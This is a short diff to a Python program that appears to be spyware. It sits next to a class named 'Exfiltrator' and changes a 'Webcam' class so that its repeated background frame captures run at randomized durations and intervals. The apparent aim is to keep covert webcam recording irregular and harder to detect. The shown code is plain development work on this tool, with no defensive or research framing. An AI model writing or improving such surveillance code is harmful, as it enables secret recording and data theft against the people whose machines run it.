@@ -180,10 +180,12 @@ class Exfiltrator:
 
 class Webcam:
     def __init__(self, interval, duration):
+        self.low_duration = duration[0]
+        self.high_duration = duration[1]
+        self.duration = random.randint(self.low_duration, self.high_duration)
         self.low_interval = interval[0]
         self.high_interval = interval[1]
         self.interval = random.randint(self.low_interval, self.high_interval)
-        self.duration = duration
 
     def start(self):
         logger.debug("Webcam started...")
@@ -203,6 +205,10 @@ class Webcam:
         cap.release()
         cv2.destroyAllWindows()
         logger.info("Frame captured...")
+
+        self.duration = random.randint(self.low_duration, self.high_duration)
+        self.interval = random.randint(self.low_interval, self.high_interval)
+
         timer = Timer(interval=self.interval, function=self.capture)
         timer.daemon = True
         timer.start()
